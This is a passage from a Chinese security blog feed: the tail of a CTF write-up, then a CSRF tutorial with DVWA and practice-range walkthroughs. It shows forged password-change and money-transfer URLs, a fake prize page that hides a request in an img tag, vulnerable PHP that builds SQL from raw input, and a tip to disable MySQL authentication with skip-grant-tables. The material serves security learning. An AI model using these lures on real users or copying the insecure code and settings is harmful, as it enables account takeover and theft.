class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">5</span>    dec_data <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./cxkdemimi.doc'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span>f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>dec_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200808170358936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里隐藏了一段，复制出来粘贴到记事本中就行了。</p><h2 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h2><p><img src="https://img-blog.csdnimg.cn/20200808173024768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到这些比较晕，原本移位要画图描点什么的，network也不懂，就是看wp看大佬的思路。<br>先将这四位数字转换成8位二进制的数字，</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">6300111111255111111111270111111119110111111</code></pre><p>每个数的前两位提取出来，然后就是提取后的一串数字，四位一组，转换成ascii码，<br>再将ascii码转换成16进制数，可以发现504B，是zip的文件头。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#-*- coding: utf-8 -*-</span><span class="token comment">#!/usr/bin/env/python</span>fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\18101\\Desktop\\t.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> fp<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>    p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> p<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">63</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'00'</span>    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">127</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'01'</span>    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">191</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'10'</span>    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token number">255</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'11'</span>    s <span class="token operator">+=</span> a<span class="token keyword">import</span> binasciiflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>wp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\18101\\Desktop\\ans.zip'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span>wp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>wp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>压缩包伪加密，好几处伪加密了，所以可以直接使用ZipCenOp直接解。<br>然后base64吧，手都酸了，<br><img src="https://img-blog.csdnimg.cn/20200808182023749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>脑洞太小啊。</p><p>如果觉得写的不错的话，请我吃个糖？<a href="https://zxcv0221.github.io/about/">传送门</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF(跨站请求伪造)学习与理解</title>
      <link href="/posts/14d720b8/"/>
      <url>/posts/14d720b8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>发现团队里的同学进步都好快啊。我快要跟不上了，一直在做题，只能做动一些杂项和密码学的简单题，思路多少掌握一点，但是我学Web的，不会做Web题，现在还做不动简单题。有点发愁。做题暂时做不进去了，学点新东西缓解下疲劳。这次主要学习一下CSRF。并写下自己的学习过程和学习中对此知识的见解。</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="首先了解一下什么是CSRF。"><a href="#首先了解一下什么是CSRF。" class="headerlink" title="首先了解一下什么是CSRF。"></a>首先了解一下什么是CSRF。</h2><p>CSRF也叫跨站请求伪造。</p><blockquote><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p></blockquote><h2 id="攻击方式和危害"><a href="#攻击方式和危害" class="headerlink" title="攻击方式和危害"></a>攻击方式和危害</h2><blockquote><p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。<br>由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。<br>这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。<br>从这里可以看出：<br>攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户的浏览器，让其以用户的名义运行操作。</p></blockquote><p>以上是维基百科内容:我个人认为讲述比较清晰，也易懂，于是就摘抄过来了。然后我就再说说我自己学习时的理解。<br>危害大概有，修改用户密码进行恶意登录、恶意转账、以受害者名义发送邮件，发消息，盗取受害者的账号，甚至购买商品，虚拟货币转账，修改受害者的网络配置。就是正常用户能使用这个账号进行什么操作，攻击者都能做。</p><h2 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h2><p>1.<strong>网站信任浏览器</strong>：受害者浏览过一个网页后，会在浏览器上保存有记录，而攻击者就是通过一些方法用受害者的浏览器，去访问受害者之前访问过并且保留有信息的网页。就拿我的电脑为例：我的电脑是登录并认证了CSDN的，所以我每次登录CSDN都不需要再次输入账户密码或者扫码什么的方式进入CSDN。到那时换个浏览器(比如用火狐)，他还是会让我登录。这个就会有个问题，这样的话，CSDN是怎么辨别就是我登录的呢，这里就是上面提到的<strong>网站对用户浏览器的信任</strong>，所以在原来认证过的浏览器登录，网站会认为就是这个用户在使用。就直接同意使用该浏览器的人进入这个账户了。像我的CSDN，如果让我的朋友使用的话，他就可以直接进入我的CSDN账号，并做任何我的账户所能做的事。**(这是个人理解，如有不对的地方，还请各位大佬指点。)**</p><p>2.<strong>攻击</strong>：CSRF攻击分两种，一种是get型一种是post型。<br>首先get类型简单说明，用户修改密码的界面的URL被攻击者通过某种方式得到了，然后攻击者修改了这个URL(修改成他自己知道的密码)再次发给用户，(其过程可以将URL做一下伪装)然后用户点击，修改密码成功，攻击者就可以使用浏览器登录用户的账号进行操作(此时的密码已经是攻击者知道的那个密码了)。<br>自己理解过漏洞后，在靶场练习一下。<br>3.CSRF漏洞代码分析</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token comment">//会话验证</span>     <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$money</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"money"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">//转账操作</span><span class="token delimiter important">?></span></span></code></pre><p>由此可以看出，CSRF成功利用的条件<br>一、用户已经登录系统<br>二、用户访问对应URL</p><h2 id="靶场实验"><a href="#靶场实验" class="headerlink" title="靶场实验"></a>靶场实验</h2><p>靶场环境是DVWA</p><h4 id="本地靶场实验原理"><a href="#本地靶场实验原理" class="headerlink" title="本地靶场实验原理"></a>本地靶场实验原理</h4><p>登录靶场<br><img src="https://img-blog.csdnimg.cn/20200425105939177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>上面这个是在安全等级为impossible的程度下，可以看出修改密码的话要输入原密码的，这也是目前大多数网站的做法。奥这我就懂了，原来修改密码前输入原密码是为了防止CSRF攻击。</p><p>现在调到low级别的<br><img src="https://img-blog.csdnimg.cn/20200425110248920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看出，这个安全等级不需要输入原密码。修改一下密码，此刻充当受害者。<br><img src="https://img-blog.csdnimg.cn/20200425110838131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里显示修改成功，URL是这样的，复制一下，</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new<span class="token operator">=</span>password<span class="token operator">&amp;</span><span class="token assign-left variable">password_conf</span><span class="token operator">=</span>password<span class="token operator">&amp;</span><span class="token assign-left variable">Change</span><span class="token operator">=</span>Change<span class="token comment">#</span></code></pre><p>我做一下修改(此时我是攻击者)，将这个URL改的密码修改成我要的密码。</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new<span class="token operator">=</span>zxcv0221<span class="token operator">&amp;</span><span class="token assign-left variable">password_conf</span><span class="token operator">=</span>zxcv0221<span class="token operator">&amp;</span><span class="token assign-left variable">Change</span><span class="token operator">=</span>Change<span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200425111450916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>修改成功，当然我这是实验，受害人(我)比较傻，直接点了。<br>伪装的话，可以通过短网址生成，和简单的html来进行伪装。<br>我在靶机上构成的本地网址是没办法生成短网址的，就是<code>127.0.0.1</code>这样的都没办法生成。所以就不放图了。<br>然后就可以通过攻击者修改的密码，来进行登录了。</p><h3 id="get类型"><a href="#get类型" class="headerlink" title="get类型"></a>get类型</h3><p>get型CSRF利用，就是构造get型URL，提交username和password参数，新建一个对应的用户名和密码。<br>比如：</p><pre class="language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;127.0.0.1&#x2F;phpdemo&#x2F;1.php?username&#x3D;j4y&amp;password&#x3D;j4y</code></pre><p>这是一个添加用户的URL，将它发送给管理员，管理员点击后就会添加这么一个用户。<br>当然，这样太明显，可以放在img标签的src属性里。这是隐蔽利用。</p><h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><p>下面一个测试CSRF的代码，可以自己试一下。(在网上找的本地靶场代码)<br><img src="https://img-blog.csdnimg.cn/20200504152248764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>代码前面要连接数据库，本地mysql的用户名和密码都要输进去。<br>源代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db</span><span class="token operator">=</span><span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"csrf_test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SET NAMES 'gbk'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token double-quoted-string string">"INSERT INTO `test` (`username` ,`password`)VALUES ('<span class="token interpolation"><span class="token variable">$username</span></span>' ,'<span class="token interpolation"><span class="token variable">$password</span></span>')"</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行sql插入语句</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token double-quoted-string string">"SELECT * FROM test"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"user:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$rows</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>-----pass:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$rows</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSRF测试平台<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>GET型 CSRF<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>需要GET提交 username  password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><strong>需要自己修改一下，改成和自己的配置能连接到一起的，直接复制代码可能会出错。</strong><br>发现跑出来是这个样子。<br><img src="https://img-blog.csdnimg.cn/20200504141823825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>于是上网查解决办法，发现是php连接mysql<br>报错，原因是权限问题，root帐户默认不开放远程访问权限，所以需要修改一下相关权限。<br>解决办法是<br>打开MySQL目录下的my.ini文件，在文件的最后添加一行“skip-grant-tables”，保存并关闭文件。<br>如果正常了，那很幸运，如果还是有报错，(截图忘存了)</p><pre class="language-php" data-language="php"><code class="language-php">Notice<span class="token punctuation">:</span> Undefined index<span class="token punctuation">:</span> username in <span class="token constant">D</span><span class="token punctuation">:</span>\<span class="token package">phpStudy<span class="token punctuation">\</span>PHPTutorial<span class="token punctuation">\</span>WWW<span class="token punctuation">\</span>phpdemo<span class="token punctuation">\</span>1</span><span class="token punctuation">.</span>php on line <span class="token number">3</span></code></pre><p>这样的报错，就在代码最上方，加一行<br><code> error_reporting(E_ALL ^ E_NOTICE);</code><br>解决后，终于正常了。<br><img src="https://img-blog.csdnimg.cn/20200504151318912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后将代码隐藏在一个img标签中，这么写</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>中奖了<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>中奖了<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/phpdemo/1.php?username=admin_test&amp;password=admin_test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>访问，然后出像这样的页面。<br><img src="https://img-blog.csdnimg.cn/20200504152001140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个就已经成功了。（下面这张图是教程上的图，因为我是在虚拟机里做的，做完实验之后，就直接恢复快照了，也没有截图，这个是复现的。也懒得再配置了，显示结果，就直接用教程上的图了。）<br><img src="https://img-blog.csdnimg.cn/20200504152125836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h4 id="在线靶场实验恶意转账"><a href="#在线靶场实验恶意转账" class="headerlink" title="在线靶场实验恶意转账"></a>在线靶场实验恶意转账</h4><p><img src="https://img-blog.csdnimg.cn/20200425114655494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>已经转了10元钱给admin这个账户。<br>看下payload，</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://www.nanhack.com/payload/xss/csrf1.php?name<span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">money</span><span class="token operator">=</span><span class="token number">10</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200425114838602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>修改payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://www.nanhack.com/payload/xss/csrf1.php?name<span class="token operator">=</span>feiwu<span class="token operator">&amp;</span><span class="token assign-left variable">money</span><span class="token operator">=</span><span class="token number">100</span></code></pre><p>嗯，好了，我决定转给feiwu100块钱，这个名字我喜欢。<br><img src="https://img-blog.csdnimg.cn/20200425115124201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后我就发现我的账户上钱少了，<br><img src="https://img-blog.csdnimg.cn/20200425115413923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个时候，feiwu的账户上就会多了100，我转给他的。</p><p>直接构造CSRF链接，成功率贼低。可以用HTML的一些方法进行伪装一下。比如可以将连接隐藏在图片里。</p><h3 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h3><h4 id="post型CSRF利用"><a href="#post型CSRF利用" class="headerlink" title="post型CSRF利用"></a>post型CSRF利用</h4><p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单。<br>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。<br>可以利用一个简单的CSRFform表单提交设置一下。<br><img src="https://img-blog.csdnimg.cn/2020050415075529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>源代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"csrf_test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SET NAMES 'gbk'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"INSERT INTO `test` (`username` , `password`)VALUES ('<span class="token interpolation"><span class="token variable">$username</span></span>' , '<span class="token interpolation"><span class="token variable">$password</span></span>')"</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token double-quoted-string string">"SELECT * FROM test"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"user:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$rows</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>-----pass:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$rows</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token 